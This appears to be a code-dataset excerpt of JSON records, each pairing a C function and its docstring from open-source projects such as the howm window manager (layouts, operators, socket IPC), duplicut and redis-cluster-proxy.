{"docstring": "/** Configuration --> g_conf.chunk_size\n * Determine the size of a chunk, which must be a divisor of `file->size`.\n */\n", "func_signal": "static void     config_chunk_size(struct file *file)", "code": "{\n    double      file_size;\n    double      portions;\n    double      chunk_size;\n\n    file_size = (double) file->info.st_size;\n    chunk_size = (double) g_conf.hmap_size;\n    chunk_size *= HMAP_LOAD_FACTOR * MEDIUM_LINE_BYTES;\n    portions = round(file_size / chunk_size);\n    if (portions < 1.0)\n        portions = 1.0;\n    chunk_size = file_size / portions;\n\n    g_conf.chunk_size = (size_t) ceil(chunk_size);\n    if (!g_conf.chunk_size || g_conf.chunk_size > (size_t)file->info.st_size)\n        g_conf.chunk_size = file->info.st_size;\n}", "path": "duplicut/src/config.c", "commit_date": "2020-10-11 00:00:00", "repo_name": "nil0x42/duplicut", "stars": 774, "license": "gpl-3.0", "language": "c", "size": 1168}
{"docstring": "/* Init semaphore to 1 or 0 */\n", "func_signal": "static void bsem_init(bsem *bsem_p, int value)", "code": "{\n\tif (value < 0 || value > 1) {\n\t\terr(\"bsem_init(): Binary semaphore can take only values 1 or 0\");\n\t\texit(1);\n\t}\n\tpthread_mutex_init(&(bsem_p->mutex), NULL);\n\tpthread_cond_init(&(bsem_p->cond), NULL);\n\tbsem_p->v = value;\n}", "path": "duplicut/src/thpool.c", "commit_date": "2020-09-08 00:00:00", "repo_name": "nil0x42/duplicut", "stars": 774, "license": "gpl-3.0", "language": "c", "size": 1168}
{"docstring": "/* Wait on semaphore until semaphore has value 0 */\n", "func_signal": "static void bsem_wait(bsem* bsem_p)", "code": "{\n\tpthread_mutex_lock(&bsem_p->mutex);\n\twhile (bsem_p->v != 1) {\n\t\tpthread_cond_wait(&bsem_p->cond, &bsem_p->mutex);\n\t}\n\tbsem_p->v = 0;\n\tpthread_mutex_unlock(&bsem_p->mutex);\n}", "path": "duplicut/src/thpool.c", "commit_date": "2020-09-08 00:00:00", "repo_name": "nil0x42/duplicut", "stars": 774, "license": "gpl-3.0", "language": "c", "size": 1168}
{"docstring": "/**\n * @brief Change the layout of the current workspace.\n *\n * @param m The monitor to be arranged.\n * @param layout Represents the layout that should be used.\n */\n", "func_signal": "void change_layout(monitor_t *m, const int layout)", "code": "{\n\tif (layout == m->ws->layout || layout >= END_LAYOUT || layout < ZOOM)\n\t\treturn;\n\tm->ws->layout = layout;\n\tupdate_focused_client(m->ws->c);\n\tlog_info(\"Changed layout from %d to %d\", m->ws->last_layout,  m->ws->layout);\n\tm->ws->last_layout = m->ws->layout;\n}", "path": "howm/src/layout.c", "commit_date": "2016-01-23 00:00:00", "repo_name": "HarveyHunt/howm", "stars": 646, "license": "gpl-2.0", "language": "c", "size": 2439}
{"docstring": "/**\n * @brief An operator that kills an arbitrary amount of clients or workspaces.\n *\n * @param type Whether to kill workspaces or clients.\n * @param cnt How many workspaces or clients to kill.\n *\n * @ingroup operators\n */\n", "func_signal": "void op_kill(const unsigned int type, unsigned int cnt)", "code": "{\n\tif (type == WORKSPACE) {\n\t\tlog_info(\"Killing %d workspaces\", cnt);\n\t\twhile (cnt > 0) {\n\t\t\tkill_ws(mon, offset_ws(mon->ws, cnt - 1));\n\t\t\tcnt--;\n\t\t}\n\t} else if (type == CLIENT) {\n\t\tlog_info(\"Killing %d clients\", cnt);\n\t\twhile (cnt > 0) {\n\t\t\tkill_client(mon, mon->ws, mon->ws->c);\n\t\t\tcnt--;\n\t\t}\n\t}\n}", "path": "howm/src/op.c", "commit_date": "2016-01-23 00:00:00", "repo_name": "HarveyHunt/howm", "stars": 646, "license": "gpl-2.0", "language": "c", "size": 2439}
{"docstring": "/**\n * @brief Have one window at a time taking up the entire screen.\n *\n * Sets the geometry of each window in order for the windows to be rendered to\n * take up the entire screen.\n *\n * @param m The monitor to be arranged.\n */\n", "func_signal": "static void zoom(monitor_t *m)", "code": "{\n\tclient_t *c;\n\n\tlog_info(\"Arranging clients in zoom format\");\n\t/* When zoom is called because there aren't enough clients for other\n\t * layouts to work, draw a border to be consistent with other layouts.\n\t * */\n\tif (m->ws->layout != ZOOM && !m->ws->head->is_fullscreen)\n\t\tset_border_width(m->ws->head->win, conf.border_px);\n\n\tfor (c = m->ws->head; c; c = c->next)\n\t\tif (!FFT(c))\n\t\t\tchange_client_geom(c, m->rect.x, conf.bar_bottom\n\t\t\t\t\t? m->rect.y : m->rect.y + m->ws->bar_height,\n\t\t\t\t\tm->rect.width, m->rect.height - m->ws->bar_height);\n\tdraw_clients();\n}", "path": "howm/src/layout.c", "commit_date": "2016-01-23 00:00:00", "repo_name": "HarveyHunt/howm", "stars": 646, "license": "gpl-2.0", "language": "c", "size": 2439}
{"docstring": "/**\n * @brief Tell howm which motion is to be performed.\n *\n * This allows keybinding using an external program to still use operators.\n *\n * @param target A single char representing the motion that the operator should\n * be applied to.\n *\n * @ingroup commands\n */\n", "func_signal": "void motion(char *target)", "code": "{\n\tint type;\n\n\tif (cur_state == OPERATOR_STATE)\n\t\treturn;\n\n\tif (strncmp(target, \"w\", 1) == 0)\n\t\ttype = WORKSPACE;\n\telse if (strncmp(target, \"c\", 1) == 0)\n\t\ttype = CLIENT;\n\telse\n\t\treturn;\n\n\toperator_func(type, cur_cnt);\n\tcur_state = OPERATOR_STATE;\n\toperator_func = NULL;\n\t/* Reset so that qc is equivalent to q1c. */\n\tcur_cnt = 1;\n}", "path": "howm/src/op.c", "commit_date": "2016-01-23 00:00:00", "repo_name": "HarveyHunt/howm", "stars": 646, "license": "gpl-2.0", "language": "c", "size": 2439}
{"docstring": "/**\n * @brief Change to the last used layout.\n *\n * @param m The monitor to be arranged.\n * @ingroup commands\n */\n", "func_signal": "void last_layout(monitor_t *m)", "code": "{\n\tlog_info(\"Changing to last layout (%d)\", m->ws->last_layout);\n\tchange_layout(m, m->ws->last_layout);\n}", "path": "howm/src/layout.c", "commit_date": "2016-01-23 00:00:00", "repo_name": "HarveyHunt/howm", "stars": 646, "license": "gpl-2.0", "language": "c", "size": 2439}
{"docstring": "/**\n * @brief Cut one or more clients and add them onto howm's delete register\n * stack (if there is space).\n *\n * A segment of howm's internal client list is taken and placed onto the delete\n * register stack. All clients from the list segment must be unmapped and the\n * remaining clients must be refocused.\n *\n * @param type Whether to cut an entire workspace or client.\n * @param cnt The amount of clients or workspaces to cut.\n *\n * @ingroup operators\n */\n", "func_signal": "void op_cut(const unsigned int type, unsigned int cnt)", "code": "{\n\tclient_t *tail = mon->ws->c;\n\tclient_t *head = mon->ws->c;\n\tclient_t *head_prev = prev_client(mon->ws->c, mon->ws);\n\tbool wrap = false;\n\n\tif (!head)\n\t\treturn;\n\n\tif (del_reg.size >= conf.delete_register_size) {\n\t\tlog_warn(\"No more stack space.\");\n\t\treturn;\n\t}\n\n\tif ((type == CLIENT && cnt >= mon->ws->client_cnt) || type == WORKSPACE) {\n\t\t/* TODO: Actually implement this... */\n\t\treturn;\n\n\t} else if (type == CLIENT) {\n\t\txcb_unmap_window(dpy, head->win);\n\t\tmon->ws->client_cnt--;\n\t\twhile (cnt > 1) {\n\t\t\tif (!tail->next && next_client(tail)) {\n\t\t\t\twrap = true;\n\t\t\t\t/* Join the list into a circular linked list,\n\t\t\t\t * just for now so that we don't miss any\n\t\t\t\t * clients. */\n\t\t\t\ttail->next = next_client(tail);\n\t\t\t}\n\t\t\tif (tail == mon->ws->prev_foc)\n\t\t\t\tmon->ws->prev_foc = NULL;\n\t\t\ttail = next_client(tail);\n\t\t\txcb_unmap_window(dpy, tail->win);\n\t\t\tcnt--;\n\t\t\tmon->ws->client_cnt--;\n\t\t}\n\n\t\tif (head == mon->ws->head) {\n\t\t\tmon->ws->head = head == next_client(tail) ? NULL : next_client(tail);\n\t\t} else if (wrap) {\n\t\t\tmon->ws->head = tail->next;\n\t\t\thead_prev->next = NULL;\n\t\t} else if (tail->next != head_prev) {\n\t\t\thead_prev->next = wrap ? NULL : tail->next;\n\t\t}\n\n\t\tmon->ws->c = head_prev;\n\t\ttail->next = NULL;\n\t\tupdate_focused_client(head_prev);\n\t\tstack_push(&del_reg, head);\n\t}\n}", "path": "howm/src/op.c", "commit_date": "2016-01-23 00:00:00", "repo_name": "HarveyHunt/howm", "stars": 646, "license": "gpl-2.0", "language": "c", "size": 2439}
{"docstring": "/**\n * @brief Move client/s up.\n *\n * @param type We don't support moving workspaces, so this should only be\n * client.\n * @param cnt How many clients to move.\n *\n * @ingroup operators\n */\n", "func_signal": "void op_move_up(const unsigned int type, unsigned int cnt)", "code": "{\n\tif (type == WORKSPACE)\n\t\treturn;\n\tmove_client(cnt, true);\n}", "path": "howm/src/op.c", "commit_date": "2016-01-23 00:00:00", "repo_name": "HarveyHunt/howm", "stars": 646, "license": "gpl-2.0", "language": "c", "size": 2439}
{"docstring": "/**\n * @brief Operator function to move the current focus up.\n *\n * @param type Whether to focus on clients or workspaces.\n * @param cnt The number of times to move focus.\n *\n * @ingroup operators\n */\n", "func_signal": "void op_focus_up(const unsigned int type, unsigned int cnt)", "code": "{\n\twhile (cnt > 0) {\n\t\tif (type == CLIENT)\n\t\t\tfocus_next_client();\n\t\telse if (type == WORKSPACE)\n\t\t\tfocus_next_ws();\n\t\telse\n\t\t\treturn;\n\t\tcnt--;\n\t}\n}", "path": "howm/src/op.c", "commit_date": "2016-01-23 00:00:00", "repo_name": "HarveyHunt/howm", "stars": 646, "license": "gpl-2.0", "language": "c", "size": 2439}
{"docstring": "/**\n * @brief Process a message depending on its type - a config message or a\n * function call message.\n *\n * @param msg A buffer containing the message sent by cottage.\n * @param len The length of the message.\n *\n * @return An error code resulting from processing msg.\n */\n", "func_signal": "int ipc_process(char *msg, int len)", "code": "{\n\tint err = IPC_ERR_NONE;\n\tchar **args = ipc_process_args(msg, len, &err);\n\n\tif (**args == MSG_FUNCTION)\n\t\terr = ipc_process_function(args + 1);\n\telse if (**args == MSG_CONFIG)\n\t\terr = ipc_process_config(args + 1);\n\telse\n\t\terr = IPC_ERR_UNKNOWN_TYPE;\n\n\tfree(args);\n\treturn err;\n}", "path": "howm/src/ipc.c", "commit_date": "2016-01-23 00:00:00", "repo_name": "HarveyHunt/howm", "stars": 646, "license": "gpl-2.0", "language": "c", "size": 2439}
{"docstring": "/**\n * @brief Move client/s down.\n *\n * @param type We don't support moving workspaces, so this should only be\n * client.\n * @param cnt How many clients to move.\n *\n * @ingroup operators\n */\n", "func_signal": "void op_move_down(const unsigned int type, unsigned int cnt)", "code": "{\n\tif (type == WORKSPACE)\n\t\treturn;\n\tmove_client(cnt, false);\n}", "path": "howm/src/op.c", "commit_date": "2016-01-23 00:00:00", "repo_name": "HarveyHunt/howm", "stars": 646, "license": "gpl-2.0", "language": "c", "size": 2439}
{"docstring": "/**\n * @brief Convert an argument to a boolean.\n *\n * t and 1 are considered true, f and 0 are considered false.\n *\n * @param arg A string containing the argument.\n * @param err Where an error code should be stored.\n *\n * @return A boolean, depending on whether the argument was true or false.\n */\n", "func_signal": "static bool ipc_arg_to_bool(char *arg, int *err)", "code": "{\n\tif (strcmp(\"true\", arg) == 0\n\t\t\t|| strcmp(\"t\", arg) == 0\n\t\t\t|| strcmp(\"1\", arg) == 0) {\n\t\treturn true;\n\t} else if (strcmp(\"false\", arg) == 0\n\t\t\t|| strcmp(\"f\", arg) == 0\n\t\t\t|| strcmp(\"0\", arg) == 0) {\n\t\treturn false;\n\t} else {\n\t\t*err = IPC_ERR_ARG_NOT_BOOL;\n\t\treturn false;\n\t}\n}", "path": "howm/src/ipc.c", "commit_date": "2016-01-23 00:00:00", "repo_name": "HarveyHunt/howm", "stars": 646, "license": "gpl-2.0", "language": "c", "size": 2439}
{"docstring": "/**\n * @brief Set the current count for the current operator.\n *\n * @param cnt The amount of motions the operator should affect.\n *\n * @ingroup commands\n */\n", "func_signal": "void count(const unsigned int cnt)", "code": "{\n\tif (cur_state != COUNT_STATE)\n\t\treturn;\n\tcur_cnt = cnt;\n\tcur_state = MOTION_STATE;\n}", "path": "howm/src/op.c", "commit_date": "2016-01-23 00:00:00", "repo_name": "HarveyHunt/howm", "stars": 646, "license": "gpl-2.0", "language": "c", "size": 2439}
{"docstring": "/**\n * @brief Convert a numerical string into a decimal value, such as \"12\"\n * becoming 12.\n *\n * Minus signs are handled. It is assumed that a two digit number won't start\n * with a zero. Args with more than two digits will not be accepted, nor will\n * args that aren't numerical.\n *\n * @param arg The string to be converted.\n * @param err Where errors are reported.\n * @param lower The lower bound for the returned value. Note: This is inclusive\n * @param upper The upper bound for the returned value. Note: This is inclusive\n *\n * @return The decimal representation of arg.\n */\n", "func_signal": "static int ipc_arg_to_int(char *arg, int *err, int lower, int upper)", "code": "{\n\tint ret = 0;\n\n\tif (!arg) {\n\t\t*err = IPC_ERR_TOO_FEW_ARGS;\n\t\treturn ret;\n\t}\n\n\tret = atoi(arg);\n\n\tif (ret > upper)\n\t\t*err = IPC_ERR_ARG_TOO_LARGE;\n\telse if (ret < lower)\n\t\t*err = IPC_ERR_ARG_TOO_SMALL;\n\treturn ret;\n}", "path": "howm/src/ipc.c", "commit_date": "2016-01-23 00:00:00", "repo_name": "HarveyHunt/howm", "stars": 646, "license": "gpl-2.0", "language": "c", "size": 2439}
{"docstring": "/**\n * @brief Process a config message. If the config option isn't recognised, set\n * err to IPC_ERR_NO_CONFIG.\n *\n * @param args An array of strings representing the args.\n *\n * @return err containing the error (or lack of) that has occurred.\n */\n", "func_signal": "static int ipc_process_config(char **args)", "code": "{\n\tint err = IPC_ERR_NONE;\n\tint i = 0;\n\tbool b = false;\n\n\tif (!args[0] || !args[1])\n\t\treturn IPC_ERR_TOO_FEW_ARGS;\n\n#define SET_INT(opt, arg, lower, upper) \\\n\tdo { \\\n\t\ti = ipc_arg_to_int(arg, &err, lower, upper); \\\n\t\t\tif (err == IPC_ERR_NONE) \\\n\t\t\t\topt = i; \\\n\t} while (0)\n\n\tif (strcmp(\"border_px\", args[0]) == 0)\n\t\tSET_INT(conf.border_px, args[1], 0, 32);\n\telse if (strcmp(\"float_spawn_height\", args[0]) == 0)\n\t\tSET_INT(conf.float_spawn_height, args[1], 1, mon->rect.height);\n\telse if (strcmp(\"float_spawn_width\", args[0]) == 0)\n\t\tSET_INT(conf.float_spawn_width, args[1], 1, mon->rect.width);\n\telse if (strcmp(\"scratchpad_height\", args[0]) == 0)\n\t\tSET_INT(conf.scratchpad_height, args[1], 1, mon->rect.height);\n\telse if (strcmp(\"scratchpad_width\", args[0]) == 0)\n\t\tSET_INT(conf.scratchpad_width, args[1], 1, mon->rect.width);\n\telse if (strcmp(\"op_gap_size\", args[0]) == 0)\n\t\tSET_INT(conf.op_gap_size, args[1], 0, 32);\n\telse if (strcmp(\"bar_height\", args[0]) == 0)\n\t\tSET_INT(conf.bar_height, args[1], 0, mon->rect.height);\n#undef SET_INT\n#define SET_BOOL(opt, arg) \\\n\tdo { \\\n\t\tb = ipc_arg_to_bool(arg, &err); \\\n\t\t\tif (err == IPC_ERR_NONE) \\\n\t\t\t\topt = b; \\\n\t} while (0)\n\n\telse if (strcmp(\"focus_mouse\", args[0]) == 0)\n\t\tSET_BOOL(conf.focus_mouse, args[1]);\n\telse if (strcmp(\"focus_mouse_click\", args[0]) == 0)\n\t\tSET_BOOL(conf.focus_mouse_click, args[1]);\n\telse if (strcmp(\"follow_move\", args[0]) == 0)\n\t\tSET_BOOL(conf.follow_move, args[1]);\n\telse if (strcmp(\"zoom_gap\", args[0]) == 0)\n\t\tSET_BOOL(conf.zoom_gap, args[1]);\n\telse if (strcmp(\"center_floating\", args[0]) == 0)\n\t\tSET_BOOL(conf.center_floating, args[1]);\n\telse if (strcmp(\"bar_bottom\", args[0]) == 0)\n\t\tSET_BOOL(conf.bar_bottom, args[1]);\n#undef SET_BOOL\n#define SET_COLOUR(opt, arg) \\\n\tdo { \\\n\t\tif (strlen(arg) > 7) \\\n\t\t\treturn IPC_ERR_ARG_TOO_LARGE; \\\n\t\telse if (strlen(arg) < 7) \\\n\t\t\treturn IPC_ERR_ARG_TOO_SMALL; \\\n\t\topt = get_colour(arg); \\\n\t} while (0)\n\n\telse if (strcmp(\"border_focus\", args[0]) == 0)\n\t\tSET_COLOUR(conf.border_focus, args[1]);\n\telse if (strcmp(\"border_unfocus\", args[0]) == 0)\n\t\tSET_COLOUR(conf.border_unfocus, args[1]);\n\telse if (strcmp(\"border_prev_focus\", args[0]) == 0)\n\t\tSET_COLOUR(conf.border_prev_focus, args[1]);\n\telse if (strcmp(\"border_urgent\", args[0]) == 0)\n\t\tSET_COLOUR(conf.border_urgent, args[1]);\n\telse\n\t\terr = IPC_ERR_NO_CONFIG;\n\tupdate_focused_client(mon->ws->c);\n\treturn err;\n#undef SET_COLOUR\n}", "path": "howm/src/ipc.c", "commit_date": "2016-01-23 00:00:00", "repo_name": "HarveyHunt/howm", "stars": 646, "license": "gpl-2.0", "language": "c", "size": 2439}
{"docstring": "/**\n * @brief Change to the next layout.\n *\n * @param m The monitor to be arranged.\n * @ingroup commands\n */\n", "func_signal": "void next_layout(monitor_t *m)", "code": "{\n\tint i = (m->ws->layout + 1) % END_LAYOUT;\n\n\tlog_info(\"Changing to layout (%d)\", i);\n\tchange_layout(m, i);\n}", "path": "howm/src/layout.c", "commit_date": "2016-01-23 00:00:00", "repo_name": "HarveyHunt/howm", "stars": 646, "license": "gpl-2.0", "language": "c", "size": 2439}
{"docstring": "/**\n * @brief Receive a char array from a UNIX socket and subsequently call a\n * function, passing the args from within msg.\n *\n * @param args The args (as strings).\n *\n * @return The error code, as set by this function itself or those that it\n * calls.\n */\n", "func_signal": "static int ipc_process_function(char **args)", "code": "{\n\tint err = IPC_ERR_NONE;\n\tint i = 0;\n\n#define CALL_INT(func, arg, lower, upper) \\\n\tdo { \\\n\t\ti = ipc_arg_to_int(arg, &err, lower, upper); \\\n\t\tif (err == IPC_ERR_NONE) \\\n\t\t\tfunc(i); \\\n\t} while (0)\n\n\tif (strncmp(args[0], \"teleport_client\", strlen(\"teleport_client\")) == 0) {\n\t\tCALL_INT(teleport_client, args[1], TOP_LEFT, BOTTOM_RIGHT);\n\t} else if (strncmp(args[0], \"quit\", strlen(\"quit\")) == 0) {\n\t\tCALL_INT(quit, args[1], EXIT_SUCCESS, EXIT_FAILURE);\n\t} else if (strncmp(args[0], \"resize_float_width\", strlen(\"resize_float_width\")) == 0) {\n\t\tCALL_INT(resize_float_width, args[1], -100, 100);\n\t} else if (strncmp(args[0], \"resize_float_height\", strlen(\"resize_float_height\")) == 0) {\n\t\tCALL_INT(resize_float_height, args[1], -100, 100);\n\t} else if (strncmp(args[0], \"move_float_x\", strlen(\"move_float_x\")) == 0) {\n\t\tCALL_INT(move_float_x, args[1], -100, 100);\n\t} else if (strncmp(args[0], \"move_float_y\", strlen(\"move_float_y\")) == 0) {\n\t\tCALL_INT(move_float_y, args[1], -100, 100);\n\t} else if (strncmp(args[0], \"resize_master\", strlen(\"resize_master\")) == 0) {\n\t\tCALL_INT(resize_master, args[1], -100, 100);\n\t} else if (strncmp(args[0], \"count\", strlen(\"count\")) == 0) {\n\t\tCALL_INT(count, args[1], 1, 9);\n#undef CALL_INT\n\n/*TODO: Don't do this - we should have a neat wrapper function\n * for functions requiring a workspace pointer.\n */\n#define CALL_WORKSPACE(func, arg, lower, upper) \\\n\tdo { \\\n\t\ti = ipc_arg_to_int(arg, &err, lower, upper); \\\n\t\tif (err == IPC_ERR_NONE) { \\\n\t\t\tfunc(index_to_workspace(mon, i)); \\\n\t\t} \\\n\t} while (0)\n\n\t} else if (strncmp(args[0], \"change_ws\", strlen(\"change_ws\")) == 0) {\n\t\tCALL_WORKSPACE(change_ws, args[1], 0, mon->workspace_cnt - 1);\n\t} else if (strncmp(args[0], \"current_to_ws\", strlen(\"current_to_ws\")) == 0) {\n\t\tCALL_WORKSPACE(current_to_ws, args[1], 0, mon->workspace_cnt - 1);\n#undef CALL_WORKSPACE\n\t} else if (strncmp(args[0], \"add_ws\", strlen(\"add_ws\")) == 0) {\n\t\tadd_ws(mon);\n\t} else if (strncmp(args[0], \"remove_ws\", strlen(\"remove_ws\")) == 0) {\n\t\ti = ipc_arg_to_int(args[1], &err, 0, mon->workspace_cnt - 1);\n\t\tif (err == IPC_ERR_NONE)\n\t\t\tremove_ws(mon, index_to_workspace(mon, i));\n\t} else if (strncmp(args[0], \"move_current_down\", strlen(\"move_current_down\")) == 0) {\n\t\tmove_current_down();\n\t} else if (strncmp(args[0], \"move_current_up\", strlen(\"move_current_up\")) == 0) {\n\t\tmove_current_up();\n\t} else if (strncmp(args[0], \"focus_monitor\", strlen(\"focus_monitor\")) == 0) {\n\t\ti = ipc_arg_to_int(args[1], &err, 0, mon_cnt - 1);\n\t\tif (err == IPC_ERR_NONE)\n\t\t\tfocus_monitor(index_to_monitor(i));\n\t} else if (strncmp(args[0], \"focus_next_client\", strlen(\"focus_next_client\")) == 0) {\n\t\tfocus_next_client();\n\t} else if (strncmp(args[0], \"focus_prev_client\", strlen(\"focus_prev_client\")) == 0) {\n\t\tfocus_prev_client();\n\t} else if (strncmp(args[0], \"toggle_float\", strlen(\"toggle_float\")) == 0) {\n\t\ttoggle_float();\n\t} else if (strncmp(args[0], \"toggle_fullscreen\", strlen(\"toggle_fullscreen\")) == 0) {\n\t\ttoggle_fullscreen();\n\t} else if (strncmp(args[0], \"focus_urgent\", strlen(\"focus_urgent\")) == 0) {\n\t\tfocus_urgent();\n\t} else if (strncmp(args[0], \"send_to_scratchpad\", strlen(\"send_to_scratchpad\")) == 0) {\n\t\tsend_to_scratchpad();\n\t} else if (strncmp(args[0], \"get_from_scratchpad\", strlen(\"get_from_scratchpad\")) == 0) {\n\t\tget_from_scratchpad();\n\t} else if (strncmp(args[0], \"make_master\", strlen(\"make_master\")) == 0) {\n\t\tmake_master();\n\t} else if (strncmp(args[0], \"toggle_bar\", strlen(\"toggle_bar\")) == 0) {\n\t\ttoggle_bar();\n\t} else if (strncmp(args[0], \"focus_next_ws\", strlen(\"focus_next_ws\")) == 0) {\n\t\tfocus_next_ws();\n\t} else if (strncmp(args[0], \"focus_prev_ws\", strlen(\"focus_prev_ws\")) == 0) {\n\t\tfocus_prev_ws();\n\t} else if (strncmp(args[0], \"focus_last_ws\", strlen(\"focus_last_ws\")) == 0) {\n\t\tfocus_last_ws();\n\t} else if (strncmp(args[0], \"paste\", strlen(\"paste\")) == 0) {\n\t\tpaste();\n\t} else if (strncmp(args[0], \"change_layout\", strlen(\"change_layout\")) == 0) {\n\t\t/* TODO: Allow the layout of an arbitrary monitor to be changed\n\t\t * without having to focus it. */\n\t\ti = ipc_arg_to_int(args[0], &err, ZOOM, END_LAYOUT - 1);\n\t\tif (err == IPC_ERR_NONE)\n\t\t\tchange_layout(mon, i);\n\t} else if (strncmp(args[0], \"next_layout\", strlen(\"next_layout\")) == 0) {\n\t\tnext_layout(mon);\n\t} else if (strncmp(args[0], \"prev_layout\", strlen(\"prev_layout\")) == 0) {\n\t\tprev_layout(mon);\n\t} else if (strncmp(args[0], \"last_layout\", strlen(\"last_layout\")) == 0) {\n\t\tlast_layout(mon);\n\t} else if (strncmp(args[0], \"spawn\", strlen(\"spawn\")) == 0) {\n\t\tspawn(args + 1);\n\t} else if (strncmp(args[0], \"motion\", strlen(\"motion\")) == 0) {\n\t\tmotion(args[1]);\n\t} else if (strncmp(args[0], \"op_kill\", strlen(\"op_kill\")) == 0) {\n\t\toperator_func = op_kill;\n\t\tcur_state = COUNT_STATE;\n\t} else if (strncmp(args[0], \"op_move_up\", strlen(\"op_move_up\")) == 0) {\n\t\toperator_func = op_move_up;\n\t\tcur_state = COUNT_STATE;\n\t} else if (strncmp(args[0], \"op_move_down\", strlen(\"op_move_down\")) == 0) {\n\t\toperator_func = op_move_down;\n\t\tcur_state = COUNT_STATE;\n\t} else if (strncmp(args[0], \"op_focus_down\", strlen(\"op_focus_down\")) == 0) {\n\t\toperator_func = op_focus_down;\n\t\tcur_state = COUNT_STATE;\n\t} else if (strncmp(args[0], \"op_focus_up\", strlen(\"op_focus_up\")) == 0) {\n\t\toperator_func = op_focus_up;\n\t\tcur_state = COUNT_STATE;\n\t} else if (strncmp(args[0], \"op_shrink_gaps\", strlen(\"op_shrink_gaps\")) == 0) {\n\t\toperator_func = op_shrink_gaps;\n\t\tcur_state = COUNT_STATE;\n\t} else if (strncmp(args[0], \"op_grow_gaps\", strlen(\"op_grow_gaps\")) == 0) {\n\t\toperator_func = op_grow_gaps;\n\t\tcur_state = COUNT_STATE;\n\t} else if (strncmp(args[0], \"op_cut\", strlen(\"op_cut\")) == 0) {\n\t\toperator_func = op_cut;\n\t\tcur_state = COUNT_STATE;\n\t} else {\n\t\treturn IPC_ERR_NO_FUNC;\n\t}\n\n\treturn err;\n}", "path": "howm/src/ipc.c", "commit_date": "2016-01-23 00:00:00", "repo_name": "HarveyHunt/howm", "stars": 646, "license": "gpl-2.0", "language": "c", "size": 2439}
{"docstring": "/**\n * @brief Accepts a char array and convert it into an array of strings.\n *\n * msg is split into strings (delimited by a null character) and placed in an\n * array. err is set with a corresponding error (such as args too few args), or\n * nothing.\n *\n * XXX: args must be freed by the caller.\n *\n * @param msg A char array that is read from a UNIX socket.\n * @param len The length of data in msg.\n * @param err Where any errors will be stored.\n *\n * @return A pointer to an array of strings, each one representing an argument\n * that has been passed over a UNIX socket.\n */\n", "func_signal": "static char **ipc_process_args(char *msg, int len, int *err)", "code": "{\n\tint argc = 0, i = 0, arg_start = 0, lim = 2;\n\tchar **args = malloc(lim * sizeof(char *));\n\n\tif (!args) {\n\t\t*err = IPC_ERR_ALLOC;\n\t\treturn NULL;\n\t}\n\n\tfor (; i < len; i++) {\n\t\tif (msg[i] == 0) {\n\t\t\t*(args + argc++) = msg + arg_start;\n\t\t\targ_start = i + 1;\n\n\t\t\tif (argc == lim) {\n\t\t\t\tlim *= 2;\n\t\t\t\tchar **new = realloc(args, lim * sizeof(char *));\n\n\t\t\t\tif (!new) {\n\t\t\t\t\t*err = IPC_ERR_ALLOC;\n\t\t\t\t\tfree(args);\n\t\t\t\t\treturn NULL;\n\t\t\t\t}\n\t\t\t\targs = new;\n\t\t\t}\n\t\t}\n\t}\n\n\t/* Make room to add the NULL after the last character. */\n\tif (argc == lim) {\n\t\tchar **new = realloc(args, (lim + 1) * sizeof(char *));\n\n\t\tif (!new) {\n\t\t\t*err = IPC_ERR_ALLOC;\n\t\t\treturn NULL;\n\t\t}\n\t\targs = new;\n\t}\n\n\t/* The end of the array should be NULL, as the whole array can be passed to\n\t * spawn() and that expects a NULL terminated array.\n\t *\n\t * Use argc here as args are zero indexed. */\n\t*(args + argc) = NULL;\n\n\tif (argc < 1) {\n\t\t*err = IPC_ERR_TOO_FEW_ARGS;\n\t\tfree(args);\n\t\treturn NULL;\n\t}\n\n\treturn args;\n}", "path": "howm/src/ipc.c", "commit_date": "2016-01-23 00:00:00", "repo_name": "HarveyHunt/howm", "stars": 646, "license": "gpl-2.0", "language": "c", "size": 2439}
{"docstring": "/**\n * @brief Change to the previous layout.\n *\n * @ingroup commands\n * @param m The monitor to be arranged.\n */\n", "func_signal": "void prev_layout(monitor_t *m)", "code": "{\n\tint i = m->ws->layout < 1 ? END_LAYOUT - 1 : m->ws->layout - 1;\n\n\tlog_info(\"Changing to previous layout (%d)\", i);\n\tchange_layout(m, i);\n}", "path": "howm/src/layout.c", "commit_date": "2016-01-23 00:00:00", "repo_name": "HarveyHunt/howm", "stars": 646, "license": "gpl-2.0", "language": "c", "size": 2439}
{"docstring": "/**\n * @brief Call the appropriate layout handler for each layout.\n *\n * @param m The monitor to be arranged.\n */\n", "func_signal": "void arrange_windows(monitor_t *m)", "code": "{\n\tif (!m->ws->head)\n\t\treturn;\n\tlog_debug(\"Arranging windows\");\n\tlayout_handler[m->ws->head->next ? m->ws->layout : ZOOM](mon);\n\thowm_info();\n}", "path": "howm/src/layout.c", "commit_date": "2016-01-23 00:00:00", "repo_name": "HarveyHunt/howm", "stars": 646, "license": "gpl-2.0", "language": "c", "size": 2439}
{"docstring": "/**\n * @brief Delete the UNIX socket file.\n */\n", "func_signal": "void ipc_cleanup(void)", "code": "{\n\tchar *sp = getenv(ENV_SOCK_VAR);\n\n\tif (sp)\n\t\tunlink(sp);\n\telse\n\t\tunlink(DEF_SOCK_PATH);\n}", "path": "howm/src/ipc.c", "commit_date": "2016-01-23 00:00:00", "repo_name": "HarveyHunt/howm", "stars": 646, "license": "gpl-2.0", "language": "c", "size": 2439}
{"docstring": "/* Destroy an entire dictionary */\n", "func_signal": "int _dictClear(dict *d, dictht *ht, void(callback)(void *))", "code": "{\n    unsigned long i;\n\n    /* Free all the elements */\n    for (i = 0; i < ht->size && ht->used > 0; i++) {\n        dictEntry *he, *nextHe;\n\n        if (callback && (i & 65535) == 0) callback(d->privdata);\n\n        if ((he = ht->table[i]) == NULL) continue;\n        while(he) {\n            nextHe = he->next;\n            dictFreeKey(d, he);\n            dictFreeVal(d, he);\n            zfree(he);\n            ht->used--;\n            he = nextHe;\n        }\n    }\n    /* Free the table and the allocated cache structure */\n    zfree(ht->table);\n    /* Re-initialize the table */\n    _dictReset(ht);\n    return DICT_OK; /* never fails */\n}", "path": "redis-cluster-proxy/src/dict.c", "commit_date": "2019-03-29 00:00:00", "repo_name": "RedisLabs/redis-cluster-proxy", "stars": 974, "license": "agpl-3.0", "language": "c", "size": 1433}
